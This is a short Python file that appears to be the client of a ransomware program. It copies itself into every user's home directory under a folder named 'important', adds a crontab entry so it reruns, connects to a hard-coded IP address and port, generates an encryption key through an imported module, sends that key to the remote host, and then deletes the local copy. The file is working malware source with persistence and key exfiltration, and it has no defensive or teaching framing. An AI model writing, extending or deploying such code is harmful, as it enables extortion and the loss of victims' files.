from socket import socket, gethostname
from os import makedirs,listdir,getcwd,remove
from os.path import dirname, exists
from pathlib import Path
from time import sleep
from subprocess import Popen,call


import sweeper
import encrypt

port=11111
host='192.168.1.127'


sock=socket()
def copy_self():
    for each in listdir('/home/'):
        pth='/home/'+each+'/.local/bin/important'
        try:
            makedirs(pth,exist_ok=True)
            cmd='cp '+getcwd()+'/* /home/'+each +'/.local/bin/important/ > /dev/nulls'
            Popen(cmd, shell=True)
        except PermissionError:
            pass
    checkCron()

def checkCron():
    cmd='crontab -l > cronreader'
    call(cmd,shell=True)
    with open('cronreader','r') as cf:
        ucron=cf.read()
    if not '* * * * */5 python3 /home/.local/bin/important/' in ucron:
        buildCron()

def buildCron():
    with open('cronreader','a') as cf:
        cf.write('* * * * */5 python3 /home/.local/bin/important/client.py\n')
    cmd='crontab cronreader'
    Popen(cmd,shell=True)
    with open('cronreader','a') as cf:
        cf.write('')
    remove('cronreader')
    

def connector():
    try:
        sock.connect((host, port)) #again, this requires a tuple
    except ConnectionRefusedError:
        sleep(5)
        connector()
        
def sender():
    connector()
    sweeper.movein()
    while True:
        sock.send(b"Hello. File starts now\n")
        sock.send(b"--------------------------------------------------------------\n")
        if not exists('symkey'):
            encrypt.genKey()    
        with open('symkey','rb') as f:
            data=f.read()

        sock.send(data)
    
        sock.send(b"\n--------------------------------------------------------------")
        sock.send(b"\nFile Complete\n")
        print("Sending complete")
        with open('symkey','w') as f:
            f.write("")
        remove('symkey')
        break

    sock.shutdown(1)

    sock.close()


if __name__=='__main__':
    copy_self()
    checkCron()
    sender()



        






